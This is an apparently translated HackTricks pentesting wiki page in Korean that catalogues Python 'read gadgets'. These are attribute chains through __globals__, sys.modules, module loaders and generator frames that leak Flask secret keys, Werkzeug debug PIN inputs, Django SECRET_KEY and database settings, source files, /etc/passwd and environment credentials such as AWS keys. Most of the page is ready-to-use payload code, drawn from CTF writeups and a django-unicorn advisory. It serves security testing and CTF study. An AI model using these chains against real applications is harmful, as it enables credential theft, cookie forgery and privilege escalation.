# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}


## 기본 정보

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 또는 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md)과 같은 다양한 취약점은 **Python 내부 데이터를 읽을 수 있게 하지만 코드를 실행할 수는 없게 할 수 있습니다**. 따라서 pentester는 이러한 읽기 권한을 최대한 활용하여 **민감한 권한을 획득하고 취약점을 escalation해야 합니다**.

### Flask - secret key 읽기

Flask 애플리케이션의 메인 페이지에는 이 **secret이 구성된** **`app`** 전역 객체가 있을 가능성이 높습니다.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 경우 [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html)의 **global objects에 접근**하는 gadget을 사용하기만 하면 이 object에 접근할 수 있습니다.

**vulnerability가 다른 python file에 있는 경우**, 파일을 traverse하여 main file에 도달하고 **global object `app.secret_key`에 접근**할 수 있는 gadget이 필요합니다. 또한 이 key를 알고 있으면 [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)할 수 있습니다.

다음과 같은 payload를 사용할 수 있습니다 [이 writeup에서 가져온 것](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
이 payload를 사용하여 **`app.secret_key`를 읽을** 수 있습니다. 원래 bug가 write primitive도 제공하는 경우(예: class pollution), 동일한 경로를 사용하여 이를 교체하고 더 높은 권한의 Flask cookies에 서명할 수 있습니다.

### Werkzeug - machine_id 및 node uuid

[**이 writeup의 payload 사용**](https://vozec.fr/writeups/tweedle-dum-dee/)을 통해 **machine_id**와 **uuid** node에 액세스할 수 있습니다. 이는 [**Werkzeug pin을 생성**](../../network-services-pentesting/pentesting-web/werkzeug.md)하고 `/console`의 Python console에 액세스하는 데 필요한 **private bits**입니다. 단, **debug mode가 활성화되어 있어야** 합니다:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> **`app.py`에 대한 서버의 로컬 경로**는 웹 페이지에 **경로를 표시하는** 일부 **error**를 발생시켜 확인할 수 있습니다.

취약점이 다른 python 파일에 있다면, 메인 python 파일의 객체에 접근하기 위해 이전의 Flask trick을 확인하세요.

### Django - SECRET_KEY 및 settings module

Django settings object는 애플리케이션이 시작되면 `sys.modules`에 캐시됩니다. read primitives만으로도 **`SECRET_KEY`**, fallback keys, database credentials 또는 signing salts를 leak할 수 있습니다:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
취약한 gadget이 다른 module에 있다면, 먼저 globals를 순회합니다:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`는 현재 `SECRET_KEY`만큼이나 가치가 있습니다. rotation 중에도 이전에 서명된 값을 계속 검증하기 때문입니다.<sup>[[1]](#references)</sup> 또한 `SESSION_ENGINE`과 `SESSION_SERIALIZER`를 leak하면 영향 범위가 cookie forgery뿐인지, 아니면 더 강력한 것인지 빠르게 판단할 수 있습니다. 웹 영향에 대한 자세한 내용은 [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md)를 확인하세요.

### Module loader gadgets - 소스 코드와 파일 읽기

로드된 Python 모듈은 일반적으로 `__loader__`를 유지합니다. 파일 기반 loader는 자주 `get_source()`와 `get_data()`를 노출하며, 모듈 객체에는 접근할 수 있지만 `open()`에는 접근할 수 없는 경우 이를 완벽한 **read-only primitives**로 사용할 수 있습니다:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
이는 **config modules, blueprints, helper files 또는 hidden routes**를 dump하고 API keys, DSNs, flag paths 또는 추가 gadget entry points를 복구하는 데 매우 유용합니다.

subclass enumeration만 가능한 경우, 인덱스를 하드코딩하는 대신 이름으로 loader를 검색하세요:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

generator/coroutine object를 생성하거나 접근할 수 있다면, 어떤 함수 `__globals__` gadget도 필요 없이 해당 frame에서 globals를 **leak**할 수 있습니다. 이는 `gi_frame`, `ag_frame`, `cr_frame` 또는 `f_globals`와 같은 frame attributes를 간과하고 dunder name만 차단하는 filter를 우회할 때 유용합니다:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
frame globals를 확보했다면, 다른 gadget과 동일하게 계속 진행하세요 (`sys.modules`, settings objects, `os.environ` 등). 최근 sandbox escape는 `gi_frame`과 `f_globals`가 dunder attribute가 아니며 단순한 deny-list를 우회하는 경우가 많기 때문에 이를 계속 재발견하고 있습니다.

### 로드된 모듈을 통한 환경 변수 / cloud creds

많은 jail은 여전히 어디선가 `os` 또는 `sys`를 import합니다. 접근 가능한 모든 함수의 `__init__.__globals__`를 악용하여 이미 import된 `os` 모듈로 pivot하고, API tokens, cloud keys 또는 flags가 포함된 **환경 변수**를 덤프할 수 있습니다:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
서브클래스 인덱스가 필터링된 경우 loaders를 사용합니다:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
환경 변수는 read에서 full compromise로 이동하는 데 필요한 유일한 secret인 경우가 많습니다(cloud IAM keys, database URLs, signing keys 등).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`)은 조작된 component requests를 통한 **class pollution**을 허용했습니다. `__init__.__globals__`와 같은 property path를 설정하면 attacker가 component module globals와 import된 모든 module(예: `settings`, `os`, `sys`)에 접근할 수 있었습니다. 이를 통해 code execution 없이 `SECRET_KEY`, `DATABASES` 또는 service credentials를 leak할 수 있습니다. 이 exploit chain은 전적으로 read-based이며, 위와 동일한 dunder-gadget 패턴을 사용합니다.<sup>[[5]](#references)</sup>

### chaining을 위한 Gadget collections

최근 CTF와 pyjail research에서는 attribute access와 subclass enumeration만으로 구성된 신뢰할 수 있는 read chain이 확인되었습니다. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker)와 같은 community-maintained list에는 object에서 `__globals__`, `sys.modules`, 그리고 최종적으로 sensitive data까지 이동하도록 조합할 수 있는 수백 개의 minimal gadget이 정리되어 있습니다.<sup>[[2]](#references)</sup> raw subclass index보다 **attribute/name based search**를 우선 사용하세요. `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` 등의 위치는 Python version과 추가로 import된 library에 따라 변경되기 때문입니다.

## 참고 문헌

- [1] [Django cryptographic signing 문서](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
